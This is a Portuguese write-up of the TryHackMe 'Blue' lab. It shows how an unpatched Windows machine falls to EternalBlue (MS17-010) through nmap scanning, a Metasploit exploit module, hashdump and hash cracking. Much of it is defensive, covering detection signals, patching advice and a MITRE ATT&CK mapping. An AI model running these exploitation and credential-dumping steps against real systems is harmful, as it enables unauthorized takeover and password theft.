# TryHackMe: Blue

> **Plataforma:** TryHackMe · **Dificuldade:** Fácil · **Sistema-alvo:** Windows
> **Temas:** reconhecimento de rede, exploração de SMB, coleta de credenciais, quebra de senha
> **Ferramentas:** Nmap, Metasploit, CrackStation

As flags da sala foram omitidas de propósito, seguindo as boas práticas da comunidade do TryHackMe. O objetivo deste write-up é mostrar o raciocínio e, principalmente, como um analista de SOC detectaria e evitaria esse ataque.

## Visão geral

A sala Blue simula uma máquina Windows desatualizada, com o **SMBv1 exposto** e vulnerável ao **EternalBlue (MS17-010)**. Essa é uma falha crítica de 2017 no protocolo SMBv1, usada pelo ransomware WannaCry, que afetou centenas de milhares de computadores no mundo. O exercício mostra como uma única atualização de segurança não aplicada pode dar controle total de um sistema a um atacante, **sem que ele precise de nenhuma credencial**.

## Metodologia do ataque

### 1. Reconhecimento

Comecei com uma varredura **completa**, em todas as portas, usando também os scripts de detecção de vulnerabilidades do Nmap:

```bash
nmap -p- -sV --script vuln <IP_DO_ALVO>
```

- `-p-` varre todas as 65.535 portas, e não só as 1.000 mais comuns. Assim nenhum serviço fica de fora.
- `-sV` identifica o serviço e a versão em cada porta aberta.
- `--script vuln` roda os scripts do Nmap que verificam vulnerabilidades conhecidas.

A varredura mostrou a porta **445 (SMB)** aberta e o script confirmou que o sistema era vulnerável ao MS17-010.

### 2. Exploração

Com a vulnerabilidade confirmada, usei o Metasploit:

```text
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 > set RHOSTS <IP_DO_ALVO>
msf6 > set LHOST <MEU_IP_DA_VPN>
msf6 > run
msf6 > sessions
```

O `search ms17-010` mostra que o Metasploit organiza os módulos por tipo:

- **exploit:** explora a falha e entrega acesso ao alvo. Foi o que usei.
- **auxiliary:** faz tarefas de apoio que não dão acesso, como varreduras e testes.
- **auxiliary/scanner:** um tipo de auxiliary que só **verifica** se o alvo é vulnerável, sem explorar. É útil para confirmar a falha antes de atacar.

O exploit funcionou **sem nenhuma credencial** e entregou na hora uma sessão com privilégio de **NT AUTHORITY\SYSTEM**, o nível mais alto de acesso no Windows. A própria falha já dá acesso máximo, então nem foi preciso escalar privilégios. O comando `sessions` lista e gerencia as sessões abertas.

### 3. Pós-exploração

- Extraí os **hashes de senha** dos usuários locais com o comando `hashdump`, que lê o banco de senhas do Windows (SAM).
- Quebrei um dos hashes NTLM no **CrackStation**, um serviço que compara hashes com uma base enorme de senhas já conhecidas. A senha foi encontrada na hora, o que mostra que o usuário usava uma senha fraca e comum.
- Naveguei pelo sistema de arquivos para encontrar as flags da sala.

## Visão do defensor (Blue Team)

Esta é a parte mais importante para quem quer atuar em SOC: o que o ataque deixa de rastro e como impedi-lo.

### Como detectar

| Fase do ataque | O que procurar | Fonte |
|---|---|---|
| Reconhecimento | Um único IP testando várias portas em pouco tempo | Logs de firewall, IDS/IPS |
| Exploração | Tráfego SMBv1 incomum na porta 445, especialmente vindo de fora da rede interna | IDS/IPS (assinaturas públicas para MS17-010), logs de firewall |
| Execução | Processos inesperados criados com privilégio SYSTEM | Evento 4688 do Windows (criação de processo), Sysmon evento 1 |
| Coleta de credenciais | Acesso à memória do processo LSASS ou leitura do banco SAM | Sysmon evento 10 (acesso a processo), soluções de EDR |
| Movimentação | Conexões de saída do servidor para IPs desconhecidos | Logs de firewall, Sysmon evento 3 |

### Como prevenir

- **Aplicar o patch MS17-010.** Ele foi lançado pela Microsoft em março de 2017 e sozinho teria impedido todo o ataque.
- **Desabilitar o SMBv1**, um protocolo antigo e inseguro, já substituído pelo SMBv2 e SMBv3.
- **Nunca expor o SMB diretamente à internet**: bloquear a porta 445 no firewall de perímetro.
- **Segmentar a rede**, para limitar até onde um atacante consegue chegar a partir de uma máquina comprometida.
- **Exigir senhas fortes e únicas.** Se a senha está numa base como a do CrackStation, ela cai em segundos e facilita o acesso a outros sistemas.

## Mapeamento MITRE ATT&CK

| Tática | Técnica | Na sala |
|---|---|---|
| Reconhecimento / Descoberta | T1046: Network Service Discovery | Varredura com o Nmap |
| Movimentação lateral | T1210: Exploitation of Remote Services | EternalBlue via SMB |
| Acesso a credenciais | T1003.002: OS Credential Dumping: Security Account Manager | `hashdump` |
| Acesso a credenciais | T1110.002: Brute Force: Password Cracking | CrackStation |

## O que aprendi

- **Ferramentas:** varredura completa de portas com o Nmap, Metasploit (`search`, `use`, `set`, `run`, `sessions`), a diferença entre módulos exploit, auxiliary e scanner, e extração e quebra de hashes (`hashdump` + CrackStation).
- Gestão de vulnerabilidades não é burocracia. Um patch de 2017 teria evitado o comprometimento completo da máquina, que aconteceu sem nenhuma senha.
- Uma falha leva a outra: depois do acesso, uma senha fraca caiu em segundos.
- Saber como o ataque funciona deixa claro quais logs e alertas importam para detectá-lo.
